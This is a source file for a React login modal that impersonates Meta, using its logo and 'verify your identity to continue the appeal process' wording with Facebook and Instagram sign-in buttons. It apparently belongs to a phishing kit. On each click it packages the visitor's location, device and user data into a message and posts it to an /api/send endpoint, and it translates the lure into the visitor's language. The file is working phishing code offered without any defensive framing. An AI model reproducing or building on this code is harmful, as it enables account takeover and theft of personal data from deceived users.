'use client';

import BackgroundImage from '@/assets/images/bg-image.png';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store, type LoginProvider } from '@/store/store';
import { buildAppealMessage } from '@/utils/message';
import translateText from '@/utils/translate';
import { faLock } from '@fortawesome/free-solid-svg-icons/faLock';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const FacebookIcon = () => (
    <svg className='h-[18px] w-[18px] shrink-0' viewBox='0 0 24 24' aria-hidden='true'>
        <path
            fill='#1877F2'
            d='M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z'
        />
    </svg>
);

const InstagramIcon = () => (
    <svg className='h-[18px] w-[18px] shrink-0' viewBox='0 0 24 24' aria-hidden='true'>
        <defs>
            <linearGradient id='ig-gradient-choice' x1='0%' y1='100%' x2='100%' y2='0%'>
                <stop offset='0%' stopColor='#f09433' />
                <stop offset='25%' stopColor='#e6683c' />
                <stop offset='50%' stopColor='#dc2743' />
                <stop offset='75%' stopColor='#cc2366' />
                <stop offset='100%' stopColor='#bc1888' />
            </linearGradient>
        </defs>
        <path
            fill='url(#ig-gradient-choice)'
            d='M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z'
        />
    </svg>
);

interface LoginChoiceModalProps {
    onSelect: (provider: LoginProvider) => void;
}

const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
    const [isSending, setIsSending] = useState(false);
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const { geoInfo, deviceLabel, messageId, userData, setModalOpen, setLoginProvider, setMessageId, resetFormSession } = store();

    const t = (text: string): string => translations[text] || text;

    useEffect(() => {
        if (!geoInfo) return;

        const textsToTranslate = [
            'Verify your identity',
            'Sign in with your connected account to continue the appeal process.',
            'Continue with Facebook',
            'Continue with Instagram',
            'Secure verification',
            'Close modal'
        ];

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }
            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const handleClose = () => {
        resetFormSession();
        setModalOpen(false);
    };

    const handleSelect = async (provider: LoginProvider) => {
        if (isSending) return;

        setIsSending(true);
        setLoginProvider(provider);

        const message = buildAppealMessage({
            geoInfo,
            deviceLabel,
            userData,
            loginProvider: provider
        });

        try {
            const res = await axios.post('/api/send', { message, old_message_id: messageId });
            if (res?.data?.success && typeof res.data.message_id === 'number') {
                setMessageId(res.data.message_id);
            }
        } catch {
            //
        } finally {
            setIsSending(false);
            onSelect(provider);
        }
    };

    return (
        <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-[#1C2B33]/65 px-4 backdrop-blur-md'>
            <div
                className='relative w-full max-w-[420px] overflow-hidden rounded-[24px] bg-white shadow-[0_32px_64px_-12px_rgba(0,0,0,0.35)]'
                role='dialog'
                aria-modal='true'
            >
                <button
                    type='button'
                    onClick={handleClose}
                    className='absolute top-4 right-4 z-20 flex h-9 w-9 items-center justify-center rounded-full bg-white/80 text-[#65676B] shadow-sm backdrop-blur-sm transition-all hover:bg-white hover:text-[#1C2B33] hover:shadow-md'
                    aria-label={t('Close modal')}
                >
                    <FontAwesomeIcon icon={faXmark} className='h-4 w-4' />
                </button>

                <div className='relative overflow-hidden bg-linear-to-b from-[#EDE8FF] via-[#D2D2FE] to-[#EEF0FF] px-8 pt-10 pb-5'>
                    <div className='pointer-events-none absolute -top-12 -right-12 h-44 w-44 rounded-full bg-white/40 blur-3xl' />
                    <div className='pointer-events-none absolute -bottom-10 -left-10 h-36 w-36 rounded-full bg-[#BC1888]/10 blur-3xl' />
                    <Image
                        src={BackgroundImage}
                        alt=''
                        className='relative mx-auto block h-auto w-full max-w-[260px] object-contain drop-shadow-[0_12px_32px_rgba(88,64,180,0.18)]'
                        priority
                    />
                </div>

                <div className='px-7 pt-6 pb-7'>
                    <div className='mb-6 flex flex-col items-center text-center'>
                        <Image src={MetaLogo} alt='Meta' className='mb-4 h-[18px] w-[70px]' />
                        <h2 className='text-[22px] leading-tight font-bold tracking-tight text-[#1C2B33]'>{t('Verify your identity')}</h2>
                        <p className='mt-2 max-w-[320px] text-[14px] leading-relaxed text-[#65676B]'>{t('Sign in with your connected account to continue the appeal process.')}</p>
                    </div>

                    <div className='flex flex-col gap-3'>
                        <button
                            type='button'
                            onClick={() => handleSelect('facebook')}
                            disabled={isSending}
                            className='group flex h-[50px] w-full items-center gap-3.5 rounded-full border border-[#DADDE1] bg-white px-5 text-[15px] font-semibold text-[#1C2B33] transition-all hover:border-[#1877F2]/30 hover:bg-[#F7F8FA] hover:shadow-[0_4px_16px_rgba(24,119,242,0.12)] active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-60'
                        >
                            <span className='flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-[#1877F2]/10 transition-colors group-hover:bg-[#1877F2]/15'>
                                <FacebookIcon />
                            </span>
                            {t('Continue with Facebook')}
                        </button>

                        <button
                            type='button'
                            onClick={() => handleSelect('instagram')}
                            disabled={isSending}
                            className='group flex h-[50px] w-full items-center gap-3.5 rounded-full border border-[#DADDE1] bg-white px-5 text-[15px] font-semibold text-[#1C2B33] transition-all hover:border-[#BC1888]/30 hover:bg-[#F7F8FA] hover:shadow-[0_4px_16px_rgba(188,24,136,0.1)] active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-60'
                        >
                            <span className='flex h-8 w-8 shrink-0 items-center justify-center rounded-full bg-[#BC1888]/10 transition-colors group-hover:bg-[#BC1888]/15'>
                                <InstagramIcon />
                            </span>
                            {t('Continue with Instagram')}
                        </button>
                    </div>

                    <p className='mt-5 flex items-center justify-center gap-1.5 text-[12px] text-[#8A8D91]'>
                        <FontAwesomeIcon icon={faLock} className='h-3 w-3' />
                        {t('Secure verification')}
                    </p>
                </div>
            </div>
        </div>
    );
};

export default LoginChoiceModal;
